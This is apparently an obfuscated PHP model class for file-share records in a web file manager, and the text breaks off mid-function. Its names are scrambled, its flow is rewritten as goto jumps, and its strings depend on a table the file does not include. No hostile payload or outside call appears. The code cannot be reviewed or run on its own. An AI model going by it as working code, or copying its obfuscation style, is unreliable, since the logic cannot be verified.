<?php
 goto a•ô½©Í‰ã; cœƒ¢Æ—¹: class ShareModel extends ModelBase { protected $tableName = "\163\150\141\162\145"; protected $dataAuto = array(array("\x6d\x6f\144\x69\x66\x79\x54\151\155\145", "\164\x69\155\x65", "\x69\156\x73\x65\x72\164\54\165\x70\x64\141\x74\145", "\146\x75\156\x63\164\x69\157\156"), array("\143\162\x65\x61\x74\x65\124\151\x6d\145", "\164\x69\x6d\145", "\x69\x6e\x73\x65\x72\164", "\146\165\156\x63\x74\x69\157\x6e"), array("\157\160\164\151\157\x6e\163", '', "\151\x6e\x73\x65\162\x74\x2c\165\160\x64\x61\x74\x65\54\163\145\154\x65\143\164", "\x6a\x73\157\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($fãÄáªÄ’Ë) { $DğÍù˜öÙ¾ =& $_SERVER[¾÷]; $dÆ›šŒëô¹ = isset($fãÄáªÄ’Ë[0]) ? $fãÄáªÄ’Ë[0] : !1; return array($DğÍù˜öÙ¾[1797] => array(USER_ID, $DğÍù˜öÙ¾[1798]), $DğÍù˜öÙ¾[1741] => array($dÆ›šŒëô¹, $DğÍù˜öÙ¾[1799])); } protected function listSimple() { $Côå¸©¸ç° = array($_SERVER[¾÷][1505] => USER_ID); $dÄÒ«‘ïµ = $this->field($this->fieldList)->where($Côå¸©¸ç°)->select(); return $dÄÒ«‘ïµ ? $dÄÒ«‘ïµ : array(); } protected function getInfo($fØÉóÕÍä, $Aä•Œ‡´†ä = false) { $f¤â„­è­ =& $_SERVER[¾÷]; if ($Aä•Œ‡´†ä) { return $this->_getShareInfo(array($f¤â„­è­[471] => $fØÉóÕÍä)); } $Bã‹›á³Í = $this->cacheFunctionGet($f¤â„­è­[1748], $fØÉóÕÍä); return $Bã‹›á³Í; } public function getInfoByHash($D¸ŸêŠİ¬†) { return $this->_getShareInfo(array($_SERVER[¾÷][473] => $D¸ŸêŠİ¬†)); } public function getInfoByPath($E‹£ø¸ô‘) { $E’ã‘»ª± =& $_SERVER[¾÷]; $EòÔñÖ×ËÎ = array($E’ã‘»ª±[1505] => USER_ID, $E’ã‘»ª±[399] => $E‹£ø¸ô‘); return $this->_getShareInfo($EòÔñÖ×ËÎ); } public function getInfoBySourcePath($EÚÆÆ‹¢¯) { $f§Š«ñµ±İ =& $_SERVER[¾÷]; $CŞâå¿Š½× = array($f§Š«ñµ±İ[1505] => USER_ID, $f§Š«ñµ±İ[1047] => $EÚÆÆ‹¢¯); return $this->_getShareInfo($CŞâå¿Š½×); } private function _getShareInfo($eÎ¤¹†ÄÏ) { goto BÓ³…šãÓ; B¾’ àÄ™‚: if ($eÙíˆâÓ[$CØÜœŒ×¹[399]] == $CØÜœŒ×¹[500]) { $eÙíˆâÓ[$CØÜœŒ×¹[94]] = IO::info($eÙíˆâÓ[$CØÜœŒ×¹[1047]]); } else { $eÙíˆâÓ[$CØÜœŒ×¹[94]] = Model($CØÜœŒ×¹[1180])->pathInfo($eÙíˆâÓ[$CØÜœŒ×¹[399]]); } $eÙíˆâÓ[$CØÜœŒ×¹[1801]] = $B¬ğÇ¼ˆ¯‰; return $eÙíˆâÓ; goto B´ÄïíŞÍµ; Cµ½ƒƒÑÄ: $eÎ¤¹†ÄÏ = array($CØÜœŒ×¹[471] => $eÙíˆâÓ[$CØÜœŒ×¹[471]]); $FØõ÷Š¦Ÿâ = $CØÜœŒ×¹[1800]; $B¬ğÇ¼ˆ¯‰ = Model($CØÜœŒ×¹[568])->order($CØÜœŒ×¹[397])->field($FØõ÷Š¦Ÿâ)->where($eÎ¤¹†ÄÏ)->select(); goto B¾’ àÄ™‚; BÓ³…šãÓ: $CØÜœŒ×¹ =& $_SERVER[¾÷]; $eÙíˆâÓ = $this->where($eÎ¤¹†ÄÏ)->find(); if (!$eÙíˆâÓ) { return !1; } goto Cµ½ƒƒÑÄ; B´ÄïíŞÍµ: } protected function getInfoAuth($B”ÁëâŞ™‹) { $aË‚¥´Ş¾õ =& $_SERVER[¾÷]; $a¥×ôŒ¢ß = $this->getInfo($B”ÁëâŞ™‹); $a¥×ôŒ¢ß[$aË‚¥´Ş¾õ[409]] = Model($aË‚¥´Ş¾õ[485])->authMake($a¥×ôŒ¢ß[$aË‚¥´Ş¾õ[1801]]); return $a¥×ôŒ¢ß; } protected function listData($B¤©ª¸ßÄ¿ = null, $aÖ¯‹ë­’¸ = 300) { $C…ÔùÙí¦ˆ =& $_SERVER[¾÷]; $aÛã¯İ„¥™ = array(array($C…ÔùÙí¦ˆ[476] => array($C…ÔùÙí¦ˆ[946], 0), $C…ÔùÙí¦ˆ[478] => array($C…ÔùÙí¦ˆ[946], 0), $C…ÔùÙí¦ˆ[1802] => $C…ÔùÙí¦ˆ[1756])); if ($B¤©ª¸ßÄ¿ == $C…ÔùÙí¦ˆ[1803]) { $aÛã¯İ„¥™ = array($C…ÔùÙí¦ˆ[476] => 1); } else { if ($B¤©ª¸ßÄ¿ == $C…ÔùÙí¦ˆ[1032]) { $aÛã¯İ„¥™ = array($C…ÔùÙí¦ˆ[478] => 1); } } $aÛã¯İ„¥™[$C…ÔùÙí¦ˆ[1505]] = USER_ID; $Dà…÷ÅÂˆ = $this->where($aÛã¯İ„¥™)->selectPage($aÖ¯‹ë­’¸); return $Dà…÷ÅÂˆ; } protected function listToMe($fôÑ¹Ç¾ØĞ = 300) { goto dÆÏÂ„õÇ; c°­øœÛÎå: $Cœ²¹ÔòÅê = array($B‰ëÀòº†[1806] => $CÕê¤¹ï†, $B‰ëÀòº†[1807] => $C–µ¢„÷Ê[$B‰ëÀòº†[371]]); return $Cœ²¹ÔòÅê; goto Bƒ“®›Ö––; D¤“Êœ£‘ß: if ($c±ì¿µª) { $FëíÍãöÏá = array(array($B‰ëÀòº†[553] => SourceModel::TYPE_USER, $B‰ëÀòº†[487] => USER_ID), array($B‰ëÀòº†[553] => SourceModel::TYPE_GROUP, $B‰ëÀòº†[487] => array($B‰ëÀòº†[17], $c±ì¿µª)), $B‰ëÀòº†[1802] => $B‰ëÀòº†[1756]); } $C–µ¢„÷Ê = Model($B‰ëÀòº†[568])->where($FëíÍãöÏá)->selectPage($fôÑ¹Ç¾ØĞ); $eå„Ú´«øø = array_to_keyvalue_group($C–µ¢„÷Ê[$B‰ëÀòº†[374]], $B‰ëÀòº†[471]); goto eçÄ§­ëŸ ; e“ãôºÌ³÷: $CÕê¤¹ï† = $this->field($EÎö ÛÓÊ)->where($FëíÍãöÏá)->select(); foreach ($CÕê¤¹ï† as $A³¸¢ÃğÓˆ => &$EµÙ÷øºÜ”) { $EµÙ÷øºÜ”[$B‰ëÀòº†[1801]] = $eå„Ú´«øø[$EµÙ÷øºÜ”[$B‰ëÀòº†[471]]]; } unset($EµÙ÷øºÜ”); goto c°­øœÛÎå; eçÄ§­ëŸ : if (!$eå„Ú´«øø) { return $C–µ¢„÷Ê; } $EÎö ÛÓÊ = $B‰ëÀòº†[1805]; $FëíÍãöÏá = array($B‰ëÀòº†[471] => array($B‰ëÀòº†[414], array_keys($eå„Ú´«øø))); goto e“ãôºÌ³÷; dÆÏÂ„õÇ: $B‰ëÀòº† =& $_SERVER[¾÷]; $c±ì¿µª = Model($B‰ëÀòº†[1804])->userGroupParents(USER_ID); $FëíÍãöÏá = array($B‰ëÀòº†[553] => SourceModel::TYPE_USER, $B‰ëÀòº†[487] => USER_ID); goto D¤“Êœ£‘ß; Bƒ“®›Ö––: } protected function shareAdd($D©ÑÍç‚¹, $bğ†‡¹“Äé) { $eÚ„•Ù»õ¸ =& $_SERVER[¾÷]; $cÓ‘ËÔ½¬… = $this->_addShareData($D©ÑÍç‚¹, $bğ†‡¹“Äé); if (!empty($bğ†‡¹“Äé[$eÚ„•Ù»õ¸[1808]])) { $this->_shareAuthSet($cÓ‘ËÔ½¬…, $bğ†‡¹“Äé[$eÚ„•Ù»õ¸[1808]]); } $this->shareEventAdd($D©ÑÍç‚¹, $bğ†‡¹“Äé, $eÚ„•Ù»õ¸[1035]); return $cÓ‘ËÔ½¬…; } private function shareEventAdd($f£ˆ½»”, $C±øÎ´”É, $FğÄ„¹ªî = "\x61\x64\x64") { goto Bš™Û–Ù¥ğ; Bš™Û–Ù¥ğ: $aİÔÈù‘  =& $_SERVER[¾÷]; if ($FğÄ„¹ªî == $aİÔÈù‘ [1035]) { if ($C±øÎ´”É[$aİÔÈù‘ [476]] == $aİÔÈù‘ [96]) { Model($aİÔÈù‘ [537])->eventShare($f£ˆ½»”, $aİÔÈù‘ [1809]); } if ($C±øÎ´”É[$aİÔÈù‘ [478]] == $aİÔÈù‘ [96]) { Model($aİÔÈù‘ [537])->eventShare($f£ˆ½»”, $aİÔÈù‘ [1810]); } return; } $aÀ¾ñ§Êº— = $this->getInfoByPath($f£ˆ½»”); goto EÀÓÁ¤¶³; EÀÓÁ¤¶³: $EÒî«’¢Æ‘ = $aİÔÈù‘ [1811]; if ($aÀ¾ñ§Êº—[$aİÔÈù‘ [476]] == $aİÔÈù‘ [500] && $C±øÎ´”É[$aİÔÈù‘ [476]] == $aİÔÈù‘ [96]) { $EÒî«’¢Æ‘ = $aİÔÈù‘ [1809]; } if ($aÀ¾ñ§Êº—[$aİÔÈù‘ [476]] == $aİÔÈù‘ [96] && $C±øÎ´”É[$aİÔÈù‘ [476]] == $aİÔÈù‘ [500]) { $EÒî«’¢Æ‘ = $aİÔÈù‘ [1812]; } goto Aµ±°Ã¡•; F§Ÿ„©åœ: return; goto F£Ñƒ È«¼; Aµ±°Ã¡•: if ($aÀ¾ñ§Êº—[$aİÔÈù‘ [478]] == $aİÔÈù‘ [500] && $C±øÎ´”É[$aİÔÈù‘ [478]] == $aİÔÈù‘ [96]) { $EÒî«’¢Æ‘ = $aİÔÈù‘ [1810]; } if ($aÀ¾ñ§Êº—[$aİÔÈù‘ [478]] == $aİÔÈù‘ [96] && $C±øÎ´”É[$aİÔÈù‘ [478]] == $aİÔÈù‘ [500]) { $EÒî«’¢Æ‘ = $aİÔÈù‘ [1813]; } Model($aİÔÈù‘ [537])->eventShare($f£ˆ½»”, $EÒî«’¢Æ‘); goto F§Ÿ„©åœ; F£Ñƒ È«¼: } private function _addShareData($AÚÆòŞ¨¸Ä, $EÍé¥ê™Ï = array()) { goto AŞÕà¾§º×; aî¢§Ç™††: $E·×Á·–‡î = array($D¡Óê‚âÖÕ[1497] => USER_ID, $D¡Óê‚âÖÕ[413] => $AÚÆòŞ¨¸Ä, $D¡Óê‚âÖÕ[1410] => $D¡Óê‚âÖÕ[43], $D¡Óê‚âÖÕ[476] => 0, $D¡Óê‚âÖÕ[478] => 0, $D¡Óê‚âÖÕ[1047] => $D¡Óê‚âÖÕ[43], $D¡Óê‚âÖÕ[312] => $D¡Óê‚âÖÕ[43], $D¡Óê‚âÖÕ[826] => $D¡Óê‚âÖÕ[43], $D¡Óê‚âÖÕ[1815] => 0, $D¡Óê‚âÖÕ[1816] => 0, $D¡Óê‚âÖÕ[479] => 0, $D¡Óê‚âÖÕ[480] => $D¡Óê‚âÖÕ[43], $D¡Óê‚âÖÕ[473] => $D¡Óê‚âÖÕ[43]); $dÀšÃõğ = explode($D¡Óê‚âÖÕ[57], $D¡Óê‚âÖÕ[1817]); foreach ($dÀšÃõğ as $dèõ‚Ğƒ·ğ) { if (!isset($EÍé¥ê™Ï[$dèõ‚Ğƒ·ğ])) { continue; } $E·×Á·–‡î[$dèõ‚Ğƒ·ğ] = $EÍé¥ê™Ï[$dèõ‚Ğƒ·ğ]; } goto EÈÖÏ„†Éæ; AŞÕà¾§º×: $D¡Óê‚âÖÕ =& $_SERVER[¾÷]; $D™ºŠÕ‹˜„ = array($D¡Óê‚âÖÕ[413] => $AÚÆòŞ¨¸Ä, $D¡Óê‚âÖÕ[1497] => USER_ID); if ($AÚÆòŞ¨¸Ä == 0) { $D™ºŠÕ‹˜„ = array($D¡Óê‚âÖÕ[1814] => $EÍé¥ê™Ï[$D¡Óê‚âÖÕ[1047]], $D¡Óê‚âÖÕ[1497] => USER_ID); } goto DÅ­—õ˜±; EÈÖÏ„†Éæ: $dºº•Ù§Ù» = $this->add($E·×Á·–‡î); $DÒ„•Èä = array($D¡Óê‚âÖÕ[473] => short_id($dºº•Ù§Ù»)); $this->where(array($D¡Óê‚âÖÕ[470] => $dºº•Ù§Ù»))->save($DÒ„•Èä); goto C“„†êëœ; DÅ­—õ˜±: if ($c¾İÃ÷‚õÒ = $this->where($D™ºŠÕ‹˜„)->find()) { return $c¾İÃ÷‚õÒ[$D¡Óê‚âÖÕ[471]]; } if ($AÚÆòŞ¨¸Ä == 0) { $AÛã“°ğÃ‘ = array($D¡Óê‚âÖÕ[38] => get_path_this($EÍé¥ê™Ï[$D¡Óê‚âÖÕ[85]])); } else { $AÛã“°ğÃ‘ = Model($D¡Óê‚âÖÕ[776])->sourceInfo($AÚÆòŞ¨¸Ä); if (!$AÛã“°ğÃ‘) { return !1; } } if (!$EÍé¥ê™Ï[$D¡Óê‚âÖÕ[1410]]) { $EÍé¥ê™Ï[$D¡Óê‚âÖÕ[1410]] = $AÛã“°ğÃ‘[$D¡Óê‚âÖÕ[38]]; } goto aî¢§Ç™††; C“„†êëœ: return $dºº•Ù§Ù»; goto CåÓÜÉØ÷; CåÓÜÉØ÷: } private function _shareAuthSet($f—‰Ùèäù, $CØõÌ³ßÔ) { goto AÈèÚÚ¼; AÈèÚÚ¼: $dæÊ‚“ÔÌ =& $_SERVER[¾÷]; if (!is_array($CØõÌ³ßÔ)) { return !1; } $DŸÜÇæ§ = Model($dæÊ‚“ÔÌ[1768]); goto B½³ÔÁºõ; B½³ÔÁºõ: $DŸÜÇæ§->where(array($dæÊ‚“ÔÌ[471] => $f—‰Ùèäù))->delete(); $AË†ù­¶¹ = array(); foreach ($CØõÌ³ßÔ as $FÎ®ÑŠØ©º) { $D‹¦†ñÌíÇ = SourceModel::TYPE_USER; if ($FÎ®ÑŠØ©º[$dæÊ‚“ÔÌ[407]] == SourceModel::TYPE_GROUP) { $D‹¦†ñÌíÇ = SourceModel::TYPE_GROUP; } $bøˆ±ÔË£î = array($dæÊ‚“ÔÌ[471] => $f—‰Ùèäù, $dæÊ‚“ÔÌ[407] => $D‹¦†ñÌíÇ, $dæÊ‚“ÔÌ[487] => intval($FÎ®ÑŠØ©º[$dæÊ‚“ÔÌ[487]]), $dæÊ‚“ÔÌ[1764] => 0, $dæÊ‚“ÔÌ[1818] => -1); if ($FÎ®ÑŠØ©º[$dæÊ‚“ÔÌ[1764]]) { $bøˆ±ÔË£î[$dæÊ‚“ÔÌ[1764]] = $FÎ®ÑŠØ©º[$dæÊ‚“ÔÌ[1764]]; } else { if ($FÎ®ÑŠØ©º[$dæÊ‚“ÔÌ[1818]]) { $bøˆ±ÔË£î[$dæÊ‚“ÔÌ[1818]] = $FÎ®ÑŠØ©º[$dæÊ‚“ÔÌ[1818]]; } } $AË†ù­¶¹[] = $bøˆ±ÔË£î; } goto dÈ¦ò¤±ˆ„; dÈ¦ò¤±ˆ„: return $DŸÜÇæ§->addAll($AË†ù­¶¹, array(), !0); goto DŒ§Á¨äÓÛ; DŒ§Á¨äÓÛ: } public function numViewAdd($f™³²ÑµÂ¼) { $A÷×¨ššò =& $_SERVER[¾÷]; $f±°‚ì½²Ó = array($A÷×¨ššò[470] => $f™³²ÑµÂ¼); $this->where($f±°‚ì½²Ó)->setAdd($A÷×¨ššò[1815]); } public function numDownloadAdd($eÕÎïĞÕÊª) { $fÙÖé‚÷ =& $_SERVER[¾÷]; $eØÅ­Õ¹Å‰ = array($fÙÖé‚÷[470] => $eÕÎïĞÕÊª); $this->where($eØÅ­Õ¹Å‰)->setAdd($fÙÖé‚÷[1816]); } protected function shareEdit($béãÊ£š‹ë, $EÒÜÉË÷¸ˆ) { goto Fò˜‹£ÌÃÁ; Fò˜‹£ÌÃÁ: $F³’•Í’Ç¶ =& $_SERVER[¾÷]; $fÊÎ¯‡®¿õ = $this->getInfo($béãÊ£š‹ë); if (!$fÊÎ¯‡®¿õ) { return !1; } goto CÛ›Æ²µš±; fŞ¹‹ë±: foreach ($D²°·“®ƒ« as $cÎÊ¬‰¬¿Š) { if (!array_key_exists($cÎÊ¬‰¬¿Š, $EÒÜÉË÷¸ˆ)) { continue; } $dÉË—‰µÛš[$cÎÊ¬‰¬¿Š] = $EÒÜÉË÷¸ˆ[$cÎÊ¬‰¬¿Š]; } $this->shareEventAdd($fÊÎ¯‡®¿õ[$F³’•Í’Ç¶[399]], $EÒÜÉË÷¸ˆ, $F³’•Í’Ç¶[1635]); $this->where(array($F³’•Í’Ç¶[470] => $béãÊ£š‹ë))->save($dÉË—‰µÛš); goto d¶¦İõØ ¨; d¶¦İõØ ¨: if (isset($EÒÜÉË÷¸ˆ[$F³’•Í’Ç¶[1808]])) { $this->_shareAuthSet($béãÊ£š‹ë, $EÒÜÉË÷¸ˆ[$F³’•Í’Ç¶[1808]]); } return !0; goto b–‡„Ñöö; CÛ›Æ²µš±: $this->_checkLinkShare($EÒÜÉË÷¸ˆ, $fÊÎ¯‡®¿õ); $dÉË—‰µÛš = array(); $D²°·“®ƒ« = explode($F³’•Í’Ç¶[57], $F³’•Í’Ç¶[1819]); goto fŞ¹‹ë±; b–‡„Ñöö: } private function _checkLinkShare($fß©³”ä‹, $e±Ëçšš²Ø) { goto B‘µ²÷î; B‘µ²÷î: $BùÏ—¢¼µŒ =& $_SERVER[¾÷]; if ($fß©³”ä‹[$BùÏ—¢¼µŒ[476]] != $BùÏ—¢¼µŒ[96]) { return; } $AéŒêª©­ = $e±Ëçšš²Ø[$BùÏ—¢¼µŒ[94]][$BùÏ—¢¼µŒ[399]]; goto dŞø‡ÑÚõ³; dŞø‡ÑÚõ³: if ($e±Ëçšš²Ø[$BùÏ—¢¼µŒ[94]][$BùÏ—¢¼µŒ[39]] != $BùÏ—¢¼µŒ[201]) { $F¬©œ“—©‚ = $this->_folderReport($AéŒêª©­); if (!$F¬©œ“—©‚) { return; } show_json(LNG($BùÏ—¢¼µŒ[1820]) . $BùÏ—¢¼µŒ[1821] . $F¬©œ“—©‚, !1); } $Dò’ù§Éœƒ = Model($BùÏ—¢¼µŒ[776])->fileInfoGet($e±Ëçšš²Ø[$BùÏ—¢¼µŒ[94]][$BùÏ—¢¼µŒ[399]]); if (!$Dò’ù§Éœƒ) { return; } goto C±ÜİÛÈª; C±ÜİÛÈª: $F÷Á¼ÆŠŒ = $this->shareFileMeta($Dò’ù§Éœƒ[$BùÏ—¢¼µŒ[450]]); if (isset($F÷Á¼ÆŠŒ[$BùÏ—¢¼µŒ[379]]) && $F÷Á¼ÆŠŒ[$BùÏ—¢¼µŒ[379]] == $BùÏ—¢¼µŒ[96]) { show_json(LNG($BùÏ—¢¼µŒ[1822]), !1); } goto e°í¼Õµä; e°í¼Õµä: } private function _folderReport($E„ŠÙ°¢›«) { goto fõõµ½’¢; fõõµ½’¢: $b÷Ãš’Õñò =& $_SERVER[¾÷]; $CÀÀ²Ñ‰Ø = array($b÷Ãš’Õñò[450] => array($b÷Ãš’Õñò[946], 0), $b÷Ãš’Õñò[711] => 3); $Fô³š¿¾‘ = Model($b÷Ãš’Õñò[1823])->where($CÀÀ²Ñ‰Ø)->field($b÷Ãš’Õñò[450])->select(); goto Eùˆ»ã°¸§; cââÓá­µä: $CÀÀ²Ñ‰Ø = array($b÷Ãš’Õñò[450] => array($b÷Ãš’Õñò[17], $Fô³š¿¾‘), $b÷Ãš’Õñò[490] => array($b÷Ãš’Õñò[387], "\45{$D¹Š¶ğ°}\x25"), $b÷Ãš’Õñò[426] => 0); $B—™³èÌÁº = Model($b÷Ãš’Õñò[776])->where($CÀÀ²Ñ‰Ø)->field($b÷Ãš’Õñò[1824])->find(); if (!$B—™³èÌÁº) { return !1; } goto B³¢È§œ÷Ä; B³¢È§œ÷Ä: $a±éÛÖÏöğ = substr($B—™³èÌÁº[$b÷Ãš’Õñò[490]], strpos($B—™³èÌÁº[$b÷Ãš’Õñò[490]], $D¹Š¶ğ°)); $CÀÀ²Ñ‰Ø = array($b÷Ãš’Õñò[399] => array($b÷Ãš’Õñò[17], trim($a±éÛÖÏöğ, $b÷Ãš’Õñò[57]))); $FƒŠ©Çå¨ = Model($b÷Ãš’Õñò[776])->where($CÀÀ²Ñ‰Ø)->field($b÷Ãš’Õñò[38])->select(); goto f§ê†­ôä»; f§ê†­ôä»: $F‹®ÂãİÒ˜ = array_to_keyvalue($FƒŠ©Çå¨, $b÷Ãš’Õñò[43], $b÷Ãš’Õñò[38]); $F‹®ÂãİÒ˜[] = $B—™³èÌÁº[$b÷Ãš’Õñò[38]]; return implode($b÷Ãš’Õñò[18], $F‹®ÂãİÒ˜); goto FÏŞ‹×­Å; Eùˆ»ã°¸§: if (!$Fô³š¿¾‘) { return !1; } $Fô³š¿¾‘ = array_to_keyvalue($Fô³š¿¾‘, $b÷Ãš’Õñò[43], $b÷Ãš’Õñò[450]); $D¹Š¶ğ° = $b÷Ãš’Õñò[57] . $E„ŠÙ°¢›« . $b÷Ãš’Õñò[57]; goto cââÓá­µä; FÏŞ‹×­Å: } protected function remove($D§«Ö¢Úä·) { goto DåÀ‰ñÏ³”; BÄšæã°¥Š: $BŒ¼¨˜Ü¤ä = $this->where($aäà¦–¶Œ)->delete(); if ($BŒ¼¨˜Ü¤ä) { Model($BÜõ¢ ’è[568])->where(array($BÜõ¢ ’è[471] => $D§«Ö¢Úä·))->delete(); } $eèà±¥‡‰ = is_array($D§«Ö¢Úä·) ? $D§«Ö¢Úä·[1] : array($D§«Ö¢Úä·); goto c¶È±¬ÔæÃ; c¶È±¬ÔæÃ: for ($F°Ê”„ªˆ™ = 0; $F°Ê”„ªˆ™ < count($eèà±¥‡‰); $F°Ê”„ªˆ™++) { $dâ‰ƒ¥©í = $this->getInfo($eèà±¥‡‰[$F°Ê”„ªˆ™]); if ($dâ‰ƒ¥©í[$BÜõ¢ ’è[478]] == $BÜõ¢ ’è[96]) { Model($BÜõ¢ ’è[537])->eventShare($dâ‰ƒ¥©í[$BÜõ¢ ’è[399]], $BÜõ¢ ’è[1813]); } if ($dâ‰ƒ¥©í[$BÜõ¢ ’è[476]] == $BÜõ¢ ’è[96]) { Model($BÜõ¢ ’è[537])->eventShare($dâ‰ƒ¥©í[$BÜõ¢ ’è[399]], $BÜõ¢ ’è[1812]); } } return $BŒ¼¨˜Ü¤ä; goto eÇ¹½†É¹¨; DåÀ‰ñÏ³”: $BÜõ¢ ’è =& $_SERVER[¾÷]; if (is_array($D§«Ö¢Úä·)) { $D§«Ö¢Úä· = array($BÜõ¢ ’è[17], $D§«Ö¢Úä·); } $aäà¦–¶Œ = array($BÜõ¢ ’è[471] => $D§«Ö¢Úä·); goto BÄšæã°¥Š; eÇ¹½†É¹¨: } protected function removeBySource($FÎöÑ¸­Åï) { goto EŒ‚Œ•êè±; Dõª¹•ò‰ï: $AğìÛÀ¬ë = array_to_keyvalue($AğìÛÀ¬ë, $F‰‰×øíÅ[43], $F‰‰×øíÅ[471]); if (!$AğìÛÀ¬ë) { return; } $dÓŠÙŒŞùæ = array($F‰‰×øíÅ[470] => array($F‰‰×øíÅ[414], $AğìÛÀ¬ë)); goto D‰‘Õ¥èøš; EŒ‚Œ•êè±: $F‰‰×øíÅ =& $_SERVER[¾÷]; $dÓŠÙŒŞùæ = array($F‰‰×øíÅ[413] => array($F‰‰×øíÅ[414], $FÎöÑ¸­Åï)); $AğìÛÀ¬ë = $this->field($F‰‰×øíÅ[471])->where($dÓŠÙŒŞùæ)->select(); goto Dõª¹•ò‰ï; D‰‘Õ¥èøš: $this->where($dÓŠÙŒŞùæ)->delete(); Model($F‰‰×øíÅ[568])->where($dÓŠÙŒŞùæ)->delete(); goto A‹ùÁÒÓ¹±; A‹ùÁÒÓ¹±: } public function listAll($cÖºøİİç“) { goto bÀ†ê™Â; Fğíê®Á­ : $d¾ö”‹ø®’ = $this->_makeOrder()->where($b•ñ”¯ºÇø)->selectPage(20); if (empty($d¾ö”‹ø®’[$AŸİá•[374]])) { return array(); } $this->_listDataApply($d¾ö”‹ø®’[$AŸİá•[374]]); goto E˜Ôò·¶ƒ¥; E˜Ôò·¶ƒ¥: return $d¾ö”‹ø®’; goto bòÎèİ°†‰; eŒ¦‚ÏÏ†Š: if ($cÖºøİİç“[$AŸİá•[724]]) { $aÎù”ŸÀ¯ = $cÖºøİİç“[$AŸİá•[479]] ? $cÖºøİİç“[$AŸİá•[479]] : strtotime(date($AŸİá•[1825])); $b•ñ”¯ºÇø[$AŸİá•[202]] = array($AŸİá•[338], array($cÖºøİİç“[$AŸİá•[724]], $aÎù”ŸÀ¯)); } if ($cÖºøİİç“[$AŸİá•[39]]) { $b•ñ”¯ºÇø[$cÖºøİİç“[$AŸİá•[39]]] = 1; } else { $b•ñ”¯ºÇø[] = array($AŸİá•[476] => array($AŸİá•[946], 0), $AŸİá•[478] => array($AŸİá•[946], 0), $AŸİá•[1802] => $AŸİá•[1756]); } if ($cÖºøİİç“[$AŸİá•[1752]]) { $b•ñ”¯ºÇø[] = array($AŸİá•[473] => $cÖºøİİç“[$AŸİá•[1752]], $AŸİá•[1410] => array($AŸİá•[387], "\45{$cÖºøİİç“[$AŸİá•[1752]]}\x25"), $AŸİá•[1802] => $AŸİá•[1756]); } goto Fğíê®Á­ ; bÀ†ê™Â: $AŸİá• =& $_SERVER[¾÷]; $b•ñ”¯ºÇø = array(); if ($cÖºøİİç“[$AŸİá•[1505]]) { $b•ñ”¯ºÇø[$AŸİá•[1505]] = $cÖºøİİç“[$AŸİá•[1505]]; } goto eŒ¦‚ÏÏ†Š; bòÎèİ°†‰: } public function listDataApply($C¥òóĞ‹õµ) { $this->_listDataApply($C¥òóĞ‹õµ); return $C¥òóĞ‹õµ; } private function _listDataApply(&$cëÍõ”¢œÁ) { goto Fšì»ĞÄÒ; Fšì»ĞÄÒ: $Dµ˜Ò­¸ß =& $_SERVER[¾÷]; $e Ìë´È“ê = array_to_keyvalue($cëÍõ”¢œÁ, $Dµ˜Ò­¸ß[43], $Dµ˜Ò­¸ß[1505]); $f‰Ìš˜‹¨ = Model($Dµ˜Ò­¸ß[510])->userListInfo(array_unique($e Ìë´È“ê)); goto bĞ…É…¾î×; e¶ÈÇ›õÛ: unset($eŒÇÙ…Ã¼÷); $cëÍõ”¢œÁ = array_values($cëÍõ”¢œÁ); goto E ªç•÷‚; bĞ…É…¾î×: $EÎÓ‡º‡½ = array_to_keyvalue($cëÍõ”¢œÁ, $Dµ˜Ò­¸ß[43], $Dµ˜Ò­¸ß[399]); $Dé¡™©öë = Model($Dµ˜Ò­¸ß[776])->sourceListInfo($EÎÓ‡º‡½, !0); foreach ($cëÍõ”¢œÁ as $dÎ„‚ÚÍ => &$eŒÇÙ…Ã¼÷) { $D¶—¯±åƒ“ = $eŒÇÙ…Ã¼÷[$Dµ˜Ò­¸ß[1505]]; $eŒÇÙ…Ã¼÷[$Dµ˜Ò­¸ß[1826]] = $f‰Ìš˜‹¨[$D¶—¯±åƒ“] ? $f‰Ìš˜‹¨[$D¶—¯±åƒ“] : !1; $E Ì¾ŸÍÆš = $eŒÇÙ…Ã¼÷[$Dµ˜Ò­¸ß[399]]; $eŒÇÙ…Ã¼÷[$Dµ˜Ò­¸ß[94]] = $Dé¡™©öë[$E Ì¾ŸÍÆš] ? $Dé¡™©öë[$E Ì¾ŸÍÆš] : !1; if (!$eŒÇÙ…Ã¼÷[$Dµ˜Ò­¸ß[94]] || $eŒÇÙ…Ã¼÷[$Dµ˜Ò­¸ß[94]][$Dµ˜Ò­¸ß[426]] == $Dµ˜Ò­¸ß[96]) { unset($cëÍõ”¢œÁ[$dÎ„‚ÚÍ]); } } goto e¶ÈÇ›õÛ; E ªç•÷‚: } private function _makeOrder($Dšâİ¶›î = '') { goto Cªß®Ç»¿˜; D–Ë¶­É…: $Dšâİ¶›î = $Dšâİ¶›î . "{$c»¿›çËô}\x20{$DĞ¦µ¤´æ²}"; return $this->order($Dšâİ¶›î); goto E·Éù»‹‰; Cªß®Ç»¿˜: $a®ì¬šÈ­µ =& $_SERVER[¾÷]; $dˆèäÓÆæ = array($a®ì¬šÈ­µ[202], $a®ì¬šÈ­µ[479], $a®ì¬šÈ­µ[1815], $a®ì¬šÈ­µ[1816]); $DãÈ«Ê = array($a®ì¬šÈ­µ[431] => $a®ì¬šÈ­µ[432], $a®ì¬šÈ­µ[433] => $a®ì¬šÈ­µ[434]); goto bºÅÖ±åõõ; bºÅÖ±åõõ: $c»¿›çËô = Input::get($a®ì¬šÈ­µ[438], $a®ì¬šÈ­µ[17], $a®ì¬šÈ­µ[419], $dˆèäÓÆæ); $DĞ¦µ¤´æ² = Input::get($a®ì¬šÈ­µ[439], $a®ì¬šÈ­µ[17], $a®ì¬šÈ­µ[1827], array($a®ì¬šÈ­µ[1751], $a®ì¬šÈ­µ[433])); $DĞ¦µ¤´æ² = $DãÈ«Ê[$DĞ¦µ¤´æ²]; goto D–Ë¶­É…; E·Éù»‹‰: } public function reportAdd($B©‚®ĞÂÎ¶) { $AíÎßâÆ‰ =& $_SERVER[¾÷]; $e¶Â‘ùòÀ = array($AíÎßâÆ‰[471] => $B©‚®ĞÂÎ¶[$AíÎßâÆ‰[471]], $AíÎßâÆ‰[1505] => USER_ID); if (Model($AíÎßâÆ‰[1823])->where($e¶Â‘ùòÀ)->find()) { return !1; } $Cä…‚Š“ì­ = array($AíÎßâÆ‰[471] => $B©‚®ĞÂÎ¶[$AíÎßâÆ‰[471]], $AíÎßâÆ‰[1410] => $B©‚®ĞÂÎ¶[$AíÎßâÆ‰[1410]], $AíÎßâÆ‰[399] => $B©‚®ĞÂÎ¶[$AíÎßâÆ‰[399]], $AíÎßâÆ‰[450] => 